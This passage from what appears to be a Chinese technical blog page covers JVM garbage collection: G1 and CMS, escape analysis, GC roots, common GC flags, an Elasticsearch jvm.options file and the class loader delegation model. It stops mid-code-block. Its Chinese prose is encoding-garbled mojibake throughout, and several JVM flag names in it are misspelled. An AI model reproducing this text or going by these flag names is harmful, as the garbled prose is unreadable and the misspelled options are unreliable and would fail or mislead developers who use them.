G1æ”¶é›†å™¨æœ‰åˆ©äºç¨‹åºé•¿æ—¶é—´è¿è¡Œï¼Œåˆ†é…å¤§å¯¹è±¡æ—¶ä¸ä¼šæ— æ³•å¾—åˆ°è¿ç»­çš„ç©ºé—´è€Œæå‰è§¦å‘ä¸€æ¬¡GCã€‚</p></li><li><p>å¯é¢„æµ‹çš„éåœé¡¿</p><p>  è¿™æ˜¯G1ç›¸å¯¹äºCMSçš„å¦ä¸€å¤§ä¼˜åŠ¿ï¼Œé™ä½åœé¡¿æ—¶é—´æ˜¯G1å’ŒCMSå…±åŒçš„å…³æ³¨ç‚¹ï¼Œèƒ½è®©ä½¿ç”¨è€…æ˜ç¡®æŒ‡å®šåœ¨ä¸€ä¸ªé•¿åº¦ä¸ºMæ¯«ç§’çš„æ—¶é—´ç‰‡æ®µå†…ï¼Œæ¶ˆè€—åœ¨åƒåœ¾æ”¶é›†ä¸Šçš„æ—¶é—´ä¸å¾—è¶…è¿‡Næ¯«ç§’ã€‚</p></li></ul><p>  åœ¨ä½¿ç”¨G1æ”¶é›†å™¨æ—¶ï¼ŒJavaå †çš„å†…å­˜å¸ƒå±€å’Œå…¶ä»–æ”¶é›†å™¨æœ‰å¾ˆå¤§çš„å·®åˆ«ï¼Œå®ƒå°†è¿™ä¸ªJavaå †åˆ†ä¸ºå¤šä¸ªå¤§å°ç›¸ç­‰çš„ç‹¬ç«‹åŒºåŸŸï¼Œè™½ç„¶è¿˜ä¿ç•™æ–°ç”Ÿä»£å’Œè€å¹´ä»£çš„æ¦‚å¿µï¼Œä½†æ˜¯æ–°ç”Ÿä»£å’Œè€å¹´ä»£ä¸å†æ˜¯ç‰©ç†éš”ç¦»çš„äº†ï¼Œå®ƒä»¬éƒ½æ˜¯ä¸€éƒ¨åˆ†Regionï¼ˆä¸éœ€è¦è¿ç»­ï¼‰çš„é›†åˆã€‚<br>  è™½ç„¶G1çœ‹èµ·æ¥æœ‰å¾ˆå¤šä¼˜ç‚¹ï¼Œå®é™…ä¸ŠCMSè¿˜æ˜¯ä¸»æµã€‚</p></li></ul><h4 id="é€ƒé€¸åˆ†æ"><a href="#é€ƒé€¸åˆ†æ" class="headerlink" title="é€ƒé€¸åˆ†æ"></a>é€ƒé€¸åˆ†æ</h4><p>åˆ†æç¨‹åºä¸­æŒ‡é’ˆçš„åŠ¨æ€ä½œç”¨åŸŸï¼Œçœ‹æŸä¸ªæŒ‡é’ˆæ˜¯å¦æŒ‡å‘æŸä¸ªå›ºå®šçš„å¯¹è±¡å¹¶ä¸”æ²¡æœ‰â€œé€ƒé€¸â€å‡ºæŸä¸ªå‡½æ•°&#x2F;æ–¹æ³•æˆ–è€…çº¿ç¨‹çš„èŒƒå›´ã€‚å¦‚æœæ²¡æœ‰é€ƒé€¸åˆ™å¯çŸ¥è¯¥æŒ‡é’ˆåªåœ¨æŸä¸ªå±€éƒ¨èŒƒå›´å†…å¯è§ï¼Œå¤–éƒ¨ï¼ˆåˆ«çš„å‡½æ•°&#x2F;æ–¹æ³•æˆ–çº¿ç¨‹ï¼‰æ— æ³•çœ‹åˆ°å®ƒã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> StringBuffer <span class="title function_">craeteStringBuffer</span><span class="params">(String s1, String s2)</span> &#123;</span><br><span class="line">    <span class="type">StringBuffer</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">    sb.append(s1);</span><br><span class="line">    sb.append(s2);</span><br><span class="line">    <span class="keyword">return</span> sb;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶æ–¹æ³•å†…éƒ¨çš„å±€éƒ¨å˜é‡æœ‰å¯èƒ½è¢«å…¶ä»–æ–¹æ³•æ‰€æ”¹å˜ï¼Œè¿™æ ·å®ƒçš„ä½œç”¨åŸŸå°±ä¸åªæ˜¯åœ¨æ–¹æ³•å†…éƒ¨ã€‚è™½ç„¶å®ƒæ˜¯ä¸€ä¸ªå±€éƒ¨å˜é‡ï¼Œç§°å…¶é€ƒé€¸åˆ°äº†æ–¹æ³•å¤–éƒ¨ã€‚</p><h4 id="GC-roots"><a href="#GC-roots" class="headerlink" title="GC roots"></a>GC roots</h4><ul><li>æ‰€æœ‰Javaçº¿ç¨‹å½“å‰æ´»è·ƒçš„æ ˆå¸§é‡ŒæŒ‡å‘GCå †é‡Œçš„å¯¹è±¡çš„å¼•ç”¨ï¼›æ¢å¥è¯è¯´ï¼Œå½“å‰æ‰€æœ‰æ­£åœ¨è¢«è°ƒç”¨çš„æ–¹æ³•çš„å¼•ç”¨ç±»å‹çš„å‚æ•°&#x2F;å±€éƒ¨å˜é‡&#x2F;ä¸´æ—¶å€¼ã€‚</li><li>VMçš„ä¸€äº›é™æ€æ•°æ®ç»“æ„é‡ŒæŒ‡å‘GCå †é‡Œçš„å¯¹è±¡çš„å¼•ç”¨ï¼Œä¾‹å¦‚è¯´HotSpot VMé‡Œçš„Universeé‡Œæœ‰å¾ˆå¤šè¿™æ ·çš„å¼•ç”¨ã€‚</li><li>JNI handlesï¼ŒåŒ…æ‹¬global handleså’Œlocal handles</li><li>ï¼ˆçœ‹æƒ…å†µï¼‰æ‰€æœ‰å½“å‰è¢«åŠ è½½çš„Javaç±»</li><li>ï¼ˆçœ‹æƒ…å†µï¼‰Javaç±»çš„å¼•ç”¨ç±»å‹é™æ€å˜é‡</li><li>ï¼ˆçœ‹æƒ…å†µï¼‰Javaç±»çš„è¿è¡Œæ—¶å¸¸é‡æ± é‡Œçš„å¼•ç”¨ç±»å‹å¸¸é‡ï¼ˆStringæˆ–Classç±»å‹ï¼‰</li><li>ï¼ˆçœ‹æƒ…å†µï¼‰Stringå¸¸é‡æ± ï¼ˆStringTableï¼‰é‡Œçš„å¼•ç”¨</li></ul><blockquote><p>ä½œè€…ï¼šRednaxelaFX<br>é“¾æ¥ï¼š<a href="https://www.zhihu.com/question/53613423/answer/135743258">https://www.zhihu.com/question/53613423/answer/135743258</a></p></blockquote><h4 id="ä¸GCç›¸å…³çš„å¸¸ç”¨å‚æ•°"><a href="#ä¸GCç›¸å…³çš„å¸¸ç”¨å‚æ•°" class="headerlink" title="ä¸GCç›¸å…³çš„å¸¸ç”¨å‚æ•°"></a>ä¸GCç›¸å…³çš„å¸¸ç”¨å‚æ•°</h4><blockquote><p>ä»¥ -X å¼€å¤´çš„é€‰é¡¹æ˜¯éæ ‡å‡†é€‰é¡¹ã€‚ä¸è¿‡ï¼Œæœ‰äº›é€‰é¡¹ä¹Ÿå¼€å§‹å˜æˆæ ‡å‡†äº†ï¼ˆå°¤å…¶æ˜¯ -Xms å’Œ -Xmxï¼‰ã€‚ä¸æ­¤åŒæ—¶ï¼Œä¸åŒçš„ Java ç‰ˆæœ¬ä¸æ–­å¼•å…¥ -XX: é€‰é¡¹ã€‚è¿™äº›é€‰é¡¹æ˜¯å®éªŒæ€§è´¨çš„ï¼Œä¸è¦åœ¨ç”Ÿäº§ä¸­ä½¿ç”¨ã€‚</p></blockquote><ul><li><p>Xmx</p><p>  è®¾ç½®å †å†…å­˜çš„æœ€å¤§å€¼ã€‚</p></li><li><p>Xms</p><p>  è®¾ç½®å †å†…å­˜çš„åˆå§‹å€¼ã€‚</p></li><li><p>Xmn</p><p>  è®¾ç½®æ–°ç”Ÿä»£çš„å¤§å°ã€‚</p></li><li><p>Xss</p><p>  è®¾ç½®æ ˆçš„å¤§å°ã€‚</p></li><li><p>-XX:PermSize&#x3D;10M</p><p>  è¡¨ç¤ºJVMåˆå§‹åˆ†é…çš„æ°¸ä¹…ä»£çš„å®¹é‡ï¼Œå¿…é¡»ä»¥Mä¸ºå•ä½ã€‚ä»Java8å¼€å§‹ä½¿ç”¨<code>-XX:MetaspaceSize</code>å‚æ•°ã€‚</p></li><li><p>-XX:MaxPermSize&#x3D;10M</p><p>  è¡¨ç¤ºJVMå…è®¸åˆ†é…çš„æ°¸ä¹…ä»£çš„æœ€å¤§å®¹é‡ï¼Œå¿…é¡»ä»¥Mä¸ºå•ä½ï¼Œå¤§éƒ¨åˆ†æƒ…å†µä¸‹è¿™ä¸ªå‚æ•°é»˜è®¤ä¸º64Mã€‚ä»Java8å¼€å§‹ä½¿ç”¨<code>-XX:MaxMetaspaceSize</code>å‚æ•°ã€‚</p></li><li><p>-XX:+PrintTLAB</p><p>  è¡¨ç¤ºå¯ä»¥çœ‹åˆ°TLABçš„ä½¿ç”¨æƒ…å†µã€‚</p></li><li><p>-XX:PretenureSizeThreshold&#x3D;3M</p><p>  ç›´æ¥æ™‹å‡åˆ°è€å¹´ä»£çš„å¯¹è±¡å¤§å°ï¼Œè®¾ç½®è¿™ä¸ªå‚æ•°åï¼Œå¤§äºè¿™ä¸ªå‚æ•°ï¼ˆ3Mï¼‰çš„å¯¹è±¡å°†ç›´æ¥åœ¨è€å¹´ä»£åˆ†é…ã€‚</p></li><li><p>-XX:MaxTenuringThrehold&#x3D;1</p><p>  æ™‹å‡åˆ°è€å¹´ä»£çš„å¯¹è±¡å¹´é¾„ã€‚æ¯ä¸ªå¯¹è±¡åœ¨åšæŒè¿‡ä¸€æ¬¡Minor GCä¹‹åï¼Œå¹´é¾„å°±ä¼šåŠ 1ï¼Œå½“è¶…è¿‡è¿™ä¸ªå‚æ•°å€¼æ—¶å°±è¿›å…¥è€å¹´ä»£ã€‚</p></li><li><p>-XX:CompileThreshold&#x3D;1000</p><p>  è¡¨ç¤ºä¸€ä¸ªæ–¹æ³•è¢«è°ƒç”¨1000æ¬¡ä¹‹åï¼Œä¼šè¢«è®¤ä¸ºæ˜¯çƒ­ç‚¹ä»£ç ï¼Œå¹¶è§¦å‘å³æ—¶ç¼–è¯‘(JIT)ã€‚</p></li><li><p>-XX:UseAdaptiveSizePolicy</p><p>  åœ¨è¿™ç§æ¨¡å¼ä¸‹ï¼Œæ–°ç”Ÿä»£çš„å¤§å°ã€eden å’Œ survivor çš„æ¯”ä¾‹ã€æ™‹å‡è€å¹´ä»£çš„å¯¹è±¡å¹´é¾„ç­‰å‚æ•°ä¼šè¢«è‡ªåŠ¨è°ƒæ•´ï¼Œä»¥è¾¾åˆ°åœ¨å †å¤§å°ã€ååé‡å’Œåœé¡¿æ—¶é—´ä¹‹é—´çš„å¹³è¡¡ç‚¹ã€‚åœ¨æ‰‹å·¥è°ƒä¼˜æ¯”è¾ƒå›°éš¾çš„åœºåˆï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨è¿™ç§è‡ªé€‚åº”çš„æ–¹å¼ï¼Œä»…æŒ‡å®šè™šæ‹Ÿæœºçš„æœ€å¤§å †ã€ç›®æ ‡çš„ååé‡ (GCTimeRatio) å’Œåœé¡¿æ—¶é—´ (MaxGCPauseMills)ï¼Œè®©è™šæ‹Ÿæœºè‡ªå·±å®Œæˆè°ƒä¼˜å·¥ä½œã€‚</p></li><li><p>-XX:NewRatio&#x3D;4</p><p>  è¡¨ç¤ºè®¾ç½®å¹´è½»ä»£:è€å¹´ä»£çš„å¤§å°æ¯”å€¼ä¸º1:4ï¼Œè¿™æ„å‘³ç€å¹´è½»ä»£å æ•´ä¸ªå †çš„1&#x2F;5ã€‚</p></li><li><p>-XX:SurvivorRatio&#x3D;8</p><p>  æ–°ç”Ÿä»£<code>Eden</code>åŒºåŸŸä¸<code>Survivor</code>åŒºåŸŸçš„å®¹é‡æ¯”å€¼ï¼Œé»˜è®¤ä¸º8ï¼Œä»£è¡¨Eden: Suvivor&#x3D; 8: 1ã€‚</p></li><li><p>â€“XX:TargetSurvivorRatio&#x3D;90</p><p>  è®¾ç½® Survivor åŒºçš„å¯ä½¿ç”¨ç‡ã€‚è¿™é‡Œè®¾ç½®ä¸º 90%ï¼Œåˆ™å…è®¸ 90%çš„ Survivor ç©ºé—´è¢«ä½¿ç”¨ã€‚é»˜è®¤å€¼æ˜¯ 50%ã€‚æ•…è¯¥è®¾ç½®æé«˜äº† Survivor åŒºçš„ä½¿ç”¨ç‡ã€‚å½“å­˜æ”¾çš„å¯¹è±¡è¶…è¿‡è¿™ä¸ªç™¾åˆ†æ¯”ï¼Œåˆ™å¯¹è±¡ä¼šå‘å¹´è€ä»£å‹ç¼©ã€‚å› æ­¤ï¼Œè¿™ä¸ªé€‰é¡¹æ›´æœ‰åŠ©äºå°†å¯¹è±¡ç•™åœ¨å¹´è½»ä»£ã€‚</p></li><li><p>-XX:ParallelGCThreads</p><p>  è®¾ç½®ç”¨äºåƒåœ¾å›æ”¶çš„çº¿ç¨‹æ•°ã€‚é€šå¸¸æƒ…å†µä¸‹å¯ä»¥å’Œ CPU æ•°é‡ç›¸ç­‰ã€‚ä½†åœ¨ CPU æ•°é‡æ¯”è¾ƒå¤šçš„æƒ…å†µä¸‹ï¼Œè®¾ç½®ç›¸å¯¹è¾ƒå°çš„æ•°å€¼ä¹Ÿæ˜¯åˆç†çš„ã€‚</p></li><li><p>XX:MaxGCPauseMills</p><p>  è®¾ç½®æœ€å¤§åƒåœ¾æ”¶é›†åœé¡¿æ—¶é—´ã€‚å®ƒçš„å€¼æ˜¯ä¸€ä¸ªå¤§äº 0 çš„æ•´æ•°ã€‚æ”¶é›†å™¨åœ¨å·¥ä½œæ—¶ï¼Œä¼šè°ƒæ•´ Java å †å¤§å°æˆ–è€…å…¶ä»–ä¸€äº›å‚æ•°ï¼Œå°½å¯èƒ½åœ°æŠŠåœé¡¿æ—¶é—´æ§åˆ¶åœ¨ MaxGCPauseMills ä»¥å†…ã€‚</p></li><li><p>-XX:GCTimeRatio</p><p>  è®¾ç½®ååé‡å¤§å°ï¼Œå®ƒçš„å€¼æ˜¯ä¸€ä¸ª 0-100 ä¹‹é—´çš„æ•´æ•°ã€‚å‡è®¾ GCTimeRatio çš„å€¼ä¸º nï¼Œé‚£ä¹ˆç³»ç»Ÿå°†èŠ±è´¹ä¸è¶…è¿‡ 1&#x2F;(1+n) çš„æ—¶é—´ç”¨äºåƒåœ¾æ”¶é›†ã€‚</p></li><li><p>-XX:ReservedCodeCacheSize</p><p>  ä»£ç ç¼“å­˜åŒºã€‚å¦‚æœä»£ç ç¼“å­˜è¢«å æ»¡ï¼ŒJITç¼–è¯‘å™¨è¢«åœç”¨ï¼Œå­—èŠ‚ç å°†ä¸å†ä¼šè¢«ç¼–è¯‘æˆæœºå™¨ç ã€‚<code>-XX:InitialCodeCacheSize</code>ç”¨æ¥è®¾ç½®åˆå§‹å¤§å°ã€‚</p></li><li><p>-Xnoclassgc</p><p>  è¡¨ç¤ºå…³é—­JVMå¯¹ç±»çš„åƒåœ¾å›æ”¶ã€‚</p></li><li><p>-XX:+TraceClassLoading</p><p>  è¡¨ç¤ºæŸ¥çœ‹ç±»çš„åŠ è½½ä¿¡æ¯ã€‚</p></li><li><p>-XX:+TraceClassUnLoading</p><p>  è¡¨ç¤ºæŸ¥çœ‹ç±»çš„å¸è½½ä¿¡æ¯ã€‚</p></li><li><p>-XX:+PrintHeapAtGC</p><p>  è¡¨ç¤ºå¯ä»¥çœ‹åˆ°æ¯æ¬¡GCå‰åå †å†…å­˜å¸ƒå±€ã€‚</p></li><li><p>-XX:+HeapDumpOnOutOfMemoryError</p><p>  è¡¨ç¤ºå¯ä»¥è®©è™šæ‹Ÿæœºåœ¨å‡ºç°å†…å­˜æº¢å‡ºå¼‚å¸¸æ—¶Dumpå‡ºå½“å‰çš„å †å†…å­˜è½¬å‚¨å¿«ç…§ã€‚</p></li><li><p>-XX:+PrintGC</p><p>  è¡¨ç¤ºåœ¨æ§åˆ¶å°ä¸Šæ‰“å°å‡ºGCä¿¡æ¯ï¼Œç­‰åŒäº<code>-verbose:gc</code>ã€‚</p></li><li><p>-XX:+PrintGCDetails</p><p>  æ‰“å°GCæ—¥å¿—ã€‚</p></li></ul><p>ä¸‹é¢æ˜¯ElasticSearchçš„ä¸€ä»½åˆå§‹åŒ–é…ç½®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line">## JVM configuration</span><br><span class="line"></span><br><span class="line">################################################################</span><br><span class="line">## IMPORTANT: JVM heap size</span><br><span class="line">################################################################</span><br><span class="line">## ElasticSearch è¦æ±‚å †æœ€å°å†…å­˜ç­‰äºå †æœ€å¤§å†…å­˜ï¼Œåˆå§‹åŒ–æ—¶å°±ä¸€æ¬¡æ€§åˆå§‹åŒ–å¥½æ•´ä¸ªå †ï¼Œé¿å…é¢‘ç¹é‡æ–°æ‰©å±•å †å†…å­˜ã€‚</span><br><span class="line">## You should always set the min and max JVM heap</span><br><span class="line">## size to the same value. For example, to set</span><br><span class="line">## the heap to 4 GB, set:</span><br><span class="line">##</span><br><span class="line">## -Xms4g</span><br><span class="line">## -Xmx4g</span><br><span class="line">##</span><br><span class="line">## See https://www.elastic.co/guide/en/elasticsearch/reference/current/heap-size.html</span><br><span class="line">## for more information</span><br><span class="line">##</span><br><span class="line">################################################################</span><br><span class="line"></span><br><span class="line"># Xms represents the initial size of total heap space</span><br><span class="line"># Xmx represents the maximum size of total heap space</span><br><span class="line"></span><br><span class="line">-Xms2G</span><br><span class="line">-Xmx2G</span><br><span class="line"></span><br><span class="line">################################################################</span><br><span class="line">## Expert settings</span><br><span class="line">################################################################</span><br><span class="line">##</span><br><span class="line">## All settings below this section are considered</span><br><span class="line">## expert settings. Don&#x27;t tamper with them unless</span><br><span class="line">## you understand what you are doing</span><br><span class="line">##</span><br><span class="line">################################################################</span><br><span class="line"></span><br><span class="line">## GC configuration</span><br><span class="line"># ä½¿ç”¨CMSæ”¶é›†å™¨ï¼ˆæ–°ç”Ÿä»£é»˜è®¤çš„æ”¶é›†å™¨ä¸ºParNewï¼‰</span><br><span class="line">-XX:+UseConcMarkSweepGC</span><br><span class="line"># è€å¹´ä»£å®¹é‡åˆ°å¤§75å¼€å§‹è¿›è¡Œåƒåœ¾å›æ”¶</span><br><span class="line">-XX:CMSInitiatingOccupancyFraction=75</span><br><span class="line"># ä¸åŸºäºè¿è¡Œæ—¶æ”¶é›†çš„æ•°æ®æ¥å¯åŠ¨CMSåƒåœ¾æ”¶é›†å‘¨æœŸï¼Œå¼ºåˆ¶æ¯æ¬¡éƒ½ä½¿ç”¨CMSInitiatingOccupancyFractionçš„é…ç½®ã€‚</span><br><span class="line">-XX:+UseCMSInitiatingOccupancyOnly</span><br><span class="line"># åƒåœ¾å›æ”¶çº¿ç¨‹æ•°ï¼ˆæœ¬æœºåªæœ‰ä¸€ä¸ªæ ¸å¿ƒï¼‰</span><br><span class="line">-XX:ParallelGCThreads=1</span><br><span class="line"></span><br><span class="line">## optimizations</span><br><span class="line"></span><br><span class="line"># disable calls to System#gc</span><br><span class="line"># å±è”½æ‰System.gc()</span><br><span class="line">-XX:+DisableExplicitGC</span><br><span class="line"></span><br><span class="line"># pre-touch memory pages used by the JVM during initialization</span><br><span class="line">-XX:+AlwaysPreTouch</span><br><span class="line"></span><br><span class="line">## basic</span><br><span class="line"></span><br><span class="line"># force the server VM</span><br><span class="line"># ä»¥Serveræ¨¡å¼å¯åŠ¨</span><br><span class="line">-server</span><br><span class="line"></span><br><span class="line"># set to headless, just in case</span><br><span class="line">-Djava.awt.headless=true</span><br><span class="line"></span><br><span class="line"># ensure UTF-8 encoding by default (e.g. filenames)</span><br><span class="line">-Dfile.encoding=UTF-8</span><br><span class="line"></span><br><span class="line"># use our provided JNA always versus the system one</span><br><span class="line">-Djna.nosys=true</span><br><span class="line"></span><br><span class="line"># flag to explicitly tell Netty to not use unsafe</span><br><span class="line">-Dio.netty.noUnsafe=true</span><br><span class="line"></span><br><span class="line">## heap dumps</span><br><span class="line"></span><br><span class="line"># generate a heap dump when an allocation from the Java heap fails</span><br><span class="line"># heap dumps are created in the working directory of the JVM</span><br><span class="line"># è™šæ‹Ÿæœºåœ¨å‡ºç°å†…å­˜æº¢å‡ºå¼‚å¸¸æ—¶Dumpå‡ºå½“å‰çš„å†…å­˜å †è½¬å‚¨å¿«ç…§</span><br><span class="line">-XX:+HeapDumpOnOutOfMemoryError</span><br><span class="line"></span><br><span class="line"># specify an alternative path for heap dumps</span><br><span class="line"># ensure the directory exists and has sufficient space</span><br><span class="line">#-XX:HeapDumpPath=$&#123;heap.dump.path&#125;</span><br><span class="line"></span><br><span class="line">## GC logging</span><br><span class="line"># GC æ—¥å¿—</span><br><span class="line"></span><br><span class="line"># è¾“å‡ºGCçš„è¯¦ç»†æ—¥å¿—</span><br><span class="line">#-XX:+PrintGCDetails</span><br><span class="line"># è¾“å‡ºGCçš„æ—¶é—´æˆ³ï¼ˆä»¥åŸºå‡†æ—¶é—´çš„å½¢å¼ï¼‰</span><br><span class="line">#-XX:+PrintGCTimeStamps</span><br><span class="line"># è¾“å‡ºGCçš„æ—¶é—´æˆ³ï¼ˆä»¥æ—¥æœŸçš„å½¢å¼ï¼Œå¦‚ 2013-05-04T21:53:59.234+0800ï¼‰</span><br><span class="line">#-XX:+PrintGCDateStamps</span><br><span class="line">#-XX:+PrintClassHistogram</span><br><span class="line">#-XX:+PrintTenuringDistribution</span><br><span class="line">#-XX:+PrintGCApplicationStoppedTime</span><br><span class="line"></span><br><span class="line"># log GC status to a file with time stamps</span><br><span class="line"># ensure the directory exists</span><br><span class="line">#-Xloggc:$&#123;loggc&#125;</span><br><span class="line"></span><br><span class="line"># Elasticsearch 5.0.0 will throw an exception on unquoted field names in JSON.</span><br><span class="line"># If documents were already indexed with unquoted fields in a previous version</span><br><span class="line"># of Elasticsearch, some operations may throw errors.</span><br><span class="line">#</span><br><span class="line"># WARNING: This option will be removed in Elasticsearch 6.0.0 and is provided</span><br><span class="line"># only for migration purposes.</span><br><span class="line">#-Delasticsearch.json.allow_unquoted_field_names=true</span><br></pre></td></tr></table></figure><h3 id="ç±»åŠ è½½é˜¶æ®µ"><a href="#ç±»åŠ è½½é˜¶æ®µ" class="headerlink" title="ç±»åŠ è½½é˜¶æ®µ"></a>ç±»åŠ è½½é˜¶æ®µ</h3><ol><li><p>åŠ è½½å’ŒéªŒè¯</p><p> ä»ç£ç›˜æˆ–è€…ç½‘ç»œä¸­è¯»å–classæ–‡ä»¶ï¼Œæ£€æŸ¥classæ–‡ä»¶æ˜¯å¦ç¬¦åˆè§„èŒƒã€‚</p></li><li><p>å‡†å¤‡å’Œè§£æ</p><p> åˆ†é…å†…å­˜ï¼ˆé™æ€å˜é‡åˆå§‹åŒ–ï¼‰ï¼Œæ‰¾å‡ºç±»çš„ä¾èµ–å…³ç³»ã€‚</p></li><li><p>åˆå§‹åŒ–</p><p> åˆå§‹åŒ–é™æ€å˜é‡ï¼Œè¿˜ä¼šè¿è¡Œé™æ€åˆå§‹åŒ–ä»£ç å—ã€‚</p></li></ol><h3 id="ClassLoader"><a href="#ClassLoader" class="headerlink" title="ClassLoader"></a>ClassLoader</h3><p>ç±»åŠ è½½é‡‡ç”¨<code>åŒäº²å§”æ´¾æ¨¡å‹</code>ï¼Œ<code>åŒäº²å§”æ´¾æ¨¡å‹</code>è¦æ±‚é™¤äº†é¡¶å±‚çš„å¯åŠ¨ç±»åŠ è½½å™¨å¤–ï¼Œå…¶ä½™çš„ç±»åŠ è½½å™¨éƒ½åº”å½“æœ‰è‡ªå·±çš„çˆ¶ç±»ï¼ˆä¸æ˜¯ç»§æ‰¿å…³ç³»ï¼Œä½¿ç”¨ç»„åˆå®ç°ï¼‰åŠ è½½å™¨ã€‚<code>åŒäº²å§”æ´¾æ¨¡å‹</code>è¦æ±‚ç±»åŠ è½½å™¨æ”¶åˆ°äº†ç±»åŠ è½½çš„è¯·æ±‚è¦å…ˆå§”æ´¾ç»™çˆ¶ç±»åŠ è½½å™¨å»å®Œæˆï¼Œåªæœ‰å½“çˆ¶åŠ è½½å™¨åé¦ˆè‡ªå·±æ— æ³•å®Œæˆè¿™ä¸ªåŠ è½½è¯·æ±‚ï¼ˆå®ƒçš„æœç´¢èŒƒå›´ä¸­æ²¡æœ‰æ‰¾åˆ°æ‰€éœ€çš„ç±»ï¼‰æ—¶ï¼Œå­åŠ è½½å™¨æ‰ä¼šå°è¯•è‡ªå·±å»åŠ è½½ã€‚</p><p>è¿™ä¿è¯äº†è™šæ‹Ÿæœºçš„å®‰å…¨æ€§ï¼Œæ­£æ˜¯æœ‰è¿™ç§æœºåˆ¶æˆ‘ä»¬æ‰ä¸èƒ½è‡ªå®šä¹‰ä¸€ä¸ªç±»åŠ è½½å™¨å»åŠ è½½æˆ‘ä»¬è‡ªå·±å†™çš„<code>java.lang.Object</code>ç±»ã€‚</p><ol><li><p>Bootstrap ClassLoader</p><p> è´Ÿè´£åŠ è½½<code>ï¼œJAVA_HOMEï¼\lib</code>ä¸­çš„ç±»ã€‚</p></li><li><p>Extension ClassLoader</p><p> è´Ÿè´£åŠ è½½<code>ï¼œJAVA_HOMEï¼\lib\ext</code>ç›®å½•ä¸­çš„ç±»ã€‚</p></li><li><p>Application ClassLoader</p><p> è´Ÿè´£åŠ è½½ç”¨æˆ·ç±»è·¯å¾„ï¼ˆClassPathï¼‰ä¸Šæ‰€æŒ‡å®šçš„ç±»åº“ï¼Œå¼€å‘è€…å¯ä»¥ç›´æ¥ä½¿ç”¨è¿™ä¸ªç±»åŠ è½½å™¨ã€‚å¦‚æœåº”ç”¨ç¨‹åºä¸­æ²¡æœ‰è‡ªå®šä¹‰è¿‡è‡ªå·±çš„ç±»åŠ è½½å™¨ï¼Œä¸€èˆ¬æƒ…å†µä¸‹è¿™ä¸ªå°±æ˜¯ç¨‹åºä¸­é»˜è®¤çš„ç±»åŠ è½½å™¨ã€‚</p><blockquote><p>ClassPathç”¨æ¥å‘Šè¯‰è§£é‡Šå™¨ä»å“ªé‡Œå¯»æ‰¾ç±»ï¼Œå¯ä»¥ä½¿ç”¨<code>-classpath</code>é€‰é¡¹ï¼Œæˆ–è€…è®¾å®š<code>CLASSPATH</code>ç¯å¢ƒå˜é‡ã€‚ä¸€èˆ¬æˆ‘ä»¬ä¼šé…ç½®å…¨å±€<code>CLASSPATH</code>ï¼Œå¤šä¸ªæ–‡ä»¶å¤¹ç”¨åˆ†éš”ç¬¦åˆ†éš”ã€‚æ³¨æ„ï¼šä¸€èˆ¬éƒ½ä»¥<code>.</code>å¼€å¤´ï¼Œè¿™ä»£è¡¨å½“å‰æ–‡ä»¶å¤¹ã€‚æ²¡æœ‰è¿™ä¸ªé…ç½®ï¼Œæˆ‘ä»¬ç›´æ¥åœ¨æ–‡ä»¶å¤¹ä¸­è¿è¡Œ<code>java [ClassName]</code>æ˜¯æ‰¾ä¸åˆ°ç±»çš„ï¼Œå› ä¸ºå®ƒä¸ä¼šå†å½“å‰æ–‡ä»¶å¤¹æŸ¥æ‰¾ã€‚</p></blockquote></li></ol><p>è‡ªå®šä¹‰ç±»åŠ è½½å™¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 